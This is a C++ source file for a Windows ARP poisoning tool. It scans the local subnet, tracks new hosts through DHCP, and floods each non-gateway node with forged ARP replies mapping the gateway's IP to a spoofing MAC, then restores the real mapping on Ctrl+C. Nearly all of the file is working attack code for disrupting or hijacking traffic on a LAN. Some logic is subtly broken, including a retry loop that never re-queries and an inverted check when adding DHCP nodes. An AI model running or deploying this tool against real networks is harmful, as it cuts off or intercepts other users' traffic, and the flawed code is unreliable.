#include "arp_spam.h"

int main(int argc, char** argv)
{
	std::cout << "[*] List of available network interfaces: " << std::endl;

	pcap_if_t*  interfaces;
	pcap_if_t*  curr_interface;
	pcap_t*     curr_device;

	PIP_ADAPTER_ADDRESSES adapters;
	PIP_ADAPTER_ADDRESSES curr_adapter;

	std::string curr_adapter_name;

	char gateway_physical_address[6];

	ULONG buffer_len = 15000;
	char* buffer = new char[buffer_len];
	adapters = (PIP_ADAPTER_ADDRESSES) buffer;

	int status = GetAdaptersAddresses(AF_INET,
		GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_FRIENDLY_NAME | GAA_FLAG_SKIP_DNS_INFO | GAA_FLAG_SKIP_DNS_SERVER |
		GAA_FLAG_INCLUDE_GATEWAYS, nullptr, adapters, &buffer_len);

	while (status == ERROR_BUFFER_OVERFLOW)
	{
		buffer_len += buffer_len;
		delete[] buffer;
		buffer = new char[buffer_len];
	}

	if (status != ERROR_SUCCESS)
	{
		std::cout << "[*] GetAdaptersAddresses failure with " << status << " code";
		return 1;
	}

	if (pcap_findalldevs(&interfaces, g_errbuf) != 0)
	{
		std::cerr << "pcap_findalldevs() failure" << std::endl
			      << g_errbuf;
		return 1;
	}

	int devices_count;
	curr_interface = interfaces;
	for (devices_count = 0; curr_interface; devices_count++)
	{
		std::cout << "Name: "    << curr_interface->description << std::endl;
		std::cout << "Index: "   << devices_count << std::endl << std::endl;

		curr_interface = curr_interface->next;
	}
	
	int user_sel_idx = -1;
	while (user_sel_idx > devices_count || user_sel_idx < 0)
	{
		std::cout << "[*] Choose interface (index): ";
		std::cin >> user_sel_idx;
	}

	curr_interface = interfaces;
	for (int i = 0; i < user_sel_idx; i++)
	{
		curr_interface = curr_interface->next;
	}

	if ((curr_device = pcap_open_live(curr_interface->name, 350, false, 1000, g_errbuf)) == nullptr)
	{
		std::cerr << g_errbuf << std::endl;
		return 1;
	}

	// get current PIP_ADAPTER_ADDRESSES by pcap interface description name
	curr_adapter = adapters;
	std::string pcap_adapter_name = retrieve_adapter_name(curr_interface->name);
	while (curr_adapter)
	{
		if (pcap_adapter_name == std::string(curr_adapter->AdapterName))
		{
			break;
		}
		curr_adapter = curr_adapter->Next;
	}

	if (curr_adapter == nullptr)
	{
		std::cerr << "[*] could not get PIP_ADAPTER_ADDRESSES for " << curr_interface->name << std::endl
			      << "[*] make sure you pick the stable interface";
		return 1;
	}

	// get gateway
	if (curr_adapter->FirstGatewayAddress != nullptr)
	{
		memcpy(
			reinterpret_cast<sockaddr*>(&g_gateway_hints)->sa_data,
			curr_adapter->FirstGatewayAddress->Address.lpSockaddr->sa_data, 
			sizeof(curr_adapter->FirstGatewayAddress->Address.lpSockaddr->sa_data)
		);
	}
	else
	{
		std::cerr << "[*] could not get gateway address";
		return 1;
	}

	std::string physical_address_string = raw_mac_bytes_to_string((char*)curr_adapter->PhysicalAddress);

	std::cout << "[*] ARP scanning..." << std::endl;
	arp_scan_start(curr_device, curr_interface->name, curr_adapter, physical_address_string);

	std::cout << "[*] Targets list:" << std::endl;
	if (g_nodes.empty())
	{
		std::cout << "No network nodes found" << std::endl;
	}
	else
	{
		for (int i = 0; i < g_nodes.size(); i++)
		{
			static in_addr address;

			memcpy(&address.S_un.S_un_b, g_nodes[i].ip, 4);
			std::cout << "* " << inet_ntoa(address) << std::endl;
		}
	}

	// get original gateway mac address for restore on quit
	ULONG outLen;
	status = SendARP(g_gateway_hints.sin_addr.s_addr, 0, gateway_physical_address, &outLen);
	if (status != NO_ERROR)
	{
		std::cerr << "[*] SendARP error: " << status;
		return 1;
	}

	std::cout << "[*] Starting DHCP listener..." << std::endl;
	std::thread dhcp_thread(thr_dhcp, curr_device);
	
	std::cout << "[*] Flooding ARP packets" << std::endl << "Press CTRL + C to stop..." << std::endl;

	g_stop_asked.store(false);
	SetConsoleCtrlHandler(console_ctrl_handler, TRUE);

	// main cycle that sends fake arp packets
	arp_packet packet;
	packet.arp_opcode[0] = 0x00; packet.arp_opcode[1] = 0x02;
	memcpy(packet.eth_src, curr_adapter->PhysicalAddress, 6);
	memcpy(packet.arp_src, SPOOFING_MAC, 6);
	memcpy(packet.sender_ip, &g_gateway_hints.sin_addr.S_un.S_un_b, 4);
	while (!g_stop_asked.load())
	{
		std::lock_guard<std::mutex> lock(g_nodes_mutex);
		for (int i = 0; i < g_nodes.size() && !g_stop_asked.load(); i++)
		{
			if (g_stop_asked.load())
			{
				break;
			}
			memcpy(packet.eth_dst, g_nodes[i].mac, 6);
			memcpy(packet.arp_dst, g_nodes[i].mac, 6);
			memcpy(packet.dst_ip,  g_nodes[i].ip,  4);

			pcap_sendpacket(curr_device, (u_char*)&packet, sizeof(packet));
		}
	}

	pcap_breakloop(curr_device);

	dhcp_thread.join();

	// restoring original ARPs to nodes
	restore_nodes_arp(curr_device, (char*)curr_adapter->PhysicalAddress, gateway_physical_address);

	std::cout << "[*] Done!";
	return 0;
}
std::string raw_mac_bytes_to_string(const char* raw_bytes)
{
	std::stringstream ss;
	ss << std::hex << std::uppercase << std::setfill('0');

	for (int i = 0; i < 6; i++)
	{
		ss << std::setw(2) << (unsigned int)(unsigned char)(raw_bytes[i]);
		if (i != 5)
		{
			ss << ':';
		}
	}
	
	return ss.str();
}
void h_arpAdd(u_char* user, const struct pcap_pkthdr* pkt_header, const u_char* pkt_data)
{
	// we not poisoning gateway
	if (memcmp(&g_gateway_hints.sin_addr.S_un.S_un_b, &pkt_data[28], 4) == 0)
	{
		return;
	}

	const u_char* sender_ip  = &pkt_data[28];
	const u_char* sender_mac = &pkt_data[6];

	std::vector<node>::iterator it = std::find_if(
		g_nodes.begin(),
		g_nodes.end(),
		[sender_ip](const node& _node) { return !memcmp(_node.ip, sender_ip, 4); }
	);

	if (it == g_nodes.end())
	{
		node _node;
		memcpy(_node.ip,  &pkt_data[28],  4);
		memcpy(_node.mac, &pkt_data[6], 6);
		
		g_nodes.push_back(_node);
	}
}
void h_dhcpAdd(u_char* user, const struct pcap_pkthdr* pkt_header, const u_char* pkt_data)
{
	node _node;

	const u_char* sender_ip  = &pkt_data[296];
	const u_char* sender_mac = &pkt_data[70];

	memcpy(_node.ip, sender_ip, 4);
	memcpy(_node.mac, sender_mac, 6);

	std::vector<node>::iterator it = std::find_if(
		g_nodes.begin(),
		g_nodes.end(),
		[sender_ip](const node& _node) { return !memcmp(_node.ip, sender_ip, 4); }
	);

	if (it != g_nodes.end())
	{
		std::lock_guard<std::mutex> lock(g_nodes_mutex);
		g_nodes.push_back(_node);

		std::cout << "[*] new node connected (DHCP): " << raw_mac_bytes_to_string((char*)sender_mac);
	}
}
void thr_send_arp_packets(pcap_t* device, const char* device_name, PIP_ADAPTER_ADDRESSES adapter)
{
	arp_packet packet;

	sockaddr_in* address = (sockaddr_in*)adapter->FirstUnicastAddress->Address.lpSockaddr;
	
	packet.arp_opcode[0] = 0x00; packet.arp_opcode[1] = 0x01;

	memset(packet.eth_dst, 0xff, 6);
	memset(packet.arp_dst, 0x00, 6);

	memcpy(packet.eth_src, adapter->PhysicalAddress, 6);
	memcpy(packet.arp_src, adapter->PhysicalAddress, 6);
	memcpy(packet.sender_ip, (u_char*)&address->sin_addr.S_un.S_un_b.s_b1, 4);
	
	bpf_u_int32 net;
	bpf_u_int32 mask;

	pcap_lookupnet(device_name, &net, &mask, g_errbuf);

	net  = ntohl(net);
	mask = ntohl(mask);

	uint32_t network_address = net & mask;
	uint32_t total_nodes     = ~mask;

	for (int i = 0; i < total_nodes; i++)
	{
		uint32_t current_ip = network_address + i;
		uint32_t ip_to_send = htonl(current_ip);

		memcpy(packet.dst_ip, &ip_to_send, sizeof(ip_to_send));

		pcap_sendpacket(device, (u_char*)&packet, sizeof(packet));
	}

}
void thr_dhcp(pcap_t* device)
{
	bpf_program filter;

	const std::string filter_string("src port 68");

	pcap_compile(device, &filter, filter_string.c_str(), 1, PCAP_NETMASK_UNKNOWN);
	pcap_setfilter(device, &filter);
	pcap_loop(device, 0, h_dhcpAdd, nullptr);
}
void thr_receive_arp_packets(pcap_t* curr_device, const std::string* physical_address_string)
{
	bpf_program filter;

	std::string filter_string("arp and ether dst ");
	filter_string += *physical_address_string;

	pcap_compile(curr_device, &filter, filter_string.c_str(), 1, PCAP_NETMASK_UNKNOWN);
	pcap_setfilter(curr_device, &filter);
	pcap_loop(curr_device, 0, h_arpAdd, nullptr);
}
void arp_scan_start(pcap_t* device, const char* device_name, PIP_ADAPTER_ADDRESSES adapter, const std::string& physical_address_string)
{
	std::thread receive_arp_packets_thread (thr_receive_arp_packets, device, &physical_address_string);
	std::thread send_arp_packets_thread    (thr_send_arp_packets, device, device_name, adapter);
	send_arp_packets_thread.join();

	// 15 seconds are enough to wait for all packets to be processed
	Sleep(15000);

	pcap_breakloop(device);
	receive_arp_packets_thread.join();
}
void restore_nodes_arp(pcap_t* device, char* adapter_physical_address, char* gateway_physical_address)
{
	arp_packet packet;

	packet.arp_opcode[0] = 0x00; packet.arp_opcode[1] = 0x02;
	memcpy(packet.eth_src, adapter_physical_address, 6);
	memcpy(packet.arp_src, gateway_physical_address, 6);
	memcpy(packet.sender_ip, &g_gateway_hints.sin_addr.S_un.S_un_b, 4);

	for (int i = 0; i < g_nodes.size(); i++)
	{
		memcpy(packet.eth_dst, g_nodes[i].mac, 6);
		memcpy(packet.arp_dst, g_nodes[i].mac, 6);
		memcpy(packet.dst_ip, g_nodes[i].ip, 4);

		pcap_sendpacket(device, (u_char*)&packet, sizeof(packet));
	}

	std::cout << "[*] nodes ARPs restored!" << std::endl;
}
std::string retrieve_adapter_name(const std::string& pcap_adapter_name)
{
	std::string result = "";

	size_t start = pcap_adapter_name.find('{');
	size_t end   = pcap_adapter_name.find('}');

	if (start != std::string::npos && end != std::string::npos)
	{
		result = pcap_adapter_name.substr(start, end - start + 1);
	}

	return result;
}
BOOL WINAPI console_ctrl_handler(DWORD dwCtrlType)
{
	switch (dwCtrlType)
	{
	case CTRL_C_EVENT:
	case CTRL_CLOSE_EVENT:
		g_stop_asked = true;
		std::cout << "[*] Stopping ARP poisoning cycle, restoring original ARP to poisoned nodes..." << std::endl;
		return TRUE;
	default:
		return FALSE;
	}
}
